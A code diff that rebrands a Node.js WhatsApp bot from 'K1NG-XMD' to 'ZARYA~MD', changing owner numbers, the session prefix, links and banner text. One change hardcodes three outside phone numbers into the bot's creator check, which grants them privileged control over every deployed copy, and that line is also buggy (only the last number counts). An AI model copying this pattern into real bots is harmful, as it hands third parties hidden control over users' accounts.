@@ -44,7 +44,7 @@ const {
   const path = require('path')
   const prefix = config.PREFIX
   
-  const ownerNumber = ['50933734591']
+  const ownerNumber = ['13058962443']
   
   const tempDir = path.join(os.tmpdir(), 'cache-temp')
   if (!fs.existsSync(tempDir)) {
@@ -68,7 +68,7 @@ const {
   //===================SESSION-AUTH============================
 if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
 if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
-const sessdata = config.SESSION_ID.replace("K1NG~XMD~", '');
+const sessdata = config.SESSION_ID.replace("ZARYA~MD~", '');
 const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
 filer.download((err, data) => {
 if(err) throw err
@@ -111,21 +111,34 @@ const port = process.env.PORT || 9090;
   }
   });
   console.log('Plugins installed successful ✅')
-  console.log('K1NG-XMD CONNECTED SUCCESSFULLY ✅')
+  console.log('ZARYA~MD CONNECTED SUCCESSFULLY ✅')
   
   let up = `
-╔═════════════════
-║ *K1NG-XMD CONNECTED🪫*      
-╠═════════════════
-║ *⚡K1NG TECH*        
-╠═════════════════
-║ *🧩 YOUR PREFIX :* ${prefix}       
-╠═══════════════
+╭────── ❍ *ZARYA~MD* ❍ ──────╮
+│ 👋🏼 *Hello ZARYA~MD User!*
+│ 🎊 Meet your personal WhatsApp bot assistant.
+│ ⚡ Fast, Simple & Powerful.
+│
+│ 📌 *Your Prefix:*  ${prefix}
+│ ⚙️ *Mode:*         ${config.MODE}
+│
+│ 🔗 *Join Channel:* 
+│ https://whatsapp.com/channel/0029VbCHd5V1dAw132PB7M1B
+│
+│ ⭐ *GitHub Repo:* 
+│ https://github.com/DAWENS-BOY96/ZARYA-MD
+│
+│ 🛠️ Powered by *DAWENS TECH*
+╰────────────────────────────╯
 `;
-    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/avnlge.jpeg` }, caption: up })
-  }
-  })
-  conn.ev.on('creds.update', saveCreds)
+
+await conn.sendMessage(conn.user.id, {
+  image: { url: 'https://files.catbox.moe/pbamxw.jpeg' },
+  caption: up.trim(),
+});
+
+// 🔒 Asire sesyon an toujou sove
+conn.ev.on('creds.update', saveCreds);
 
   //==============================
 
@@ -209,7 +222,7 @@ const port = process.env.PORT || 9090;
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const jawad = ('50933734591 ');
+    const jawad = ('50933734591', '50942241547', '529711221986');
     let isCreator = [udp, jawad, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
 					.includes(mek.sender);
@@ -256,7 +269,7 @@ const port = process.env.PORT || 9090;
 				}
  //================ownerreact==============
     
-if (senderNumber.includes("50933734591") && !isReact) {
+if (senderNumber.includes("5090000000") && !isReact) {
   const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
   const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
   m.react(randomReaction);
@@ -736,7 +749,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
                         global.email
                     }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                         global.github
-                    }/gotar-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
+                    }/zarya-md\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                         global.location
                     };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                 });
@@ -777,7 +790,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
   }
   
   app.get("/", (req, res) => {
-  res.send("K1NG-XMD STARTED ✅");
+  res.send("ZARYA~MD STARTED ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
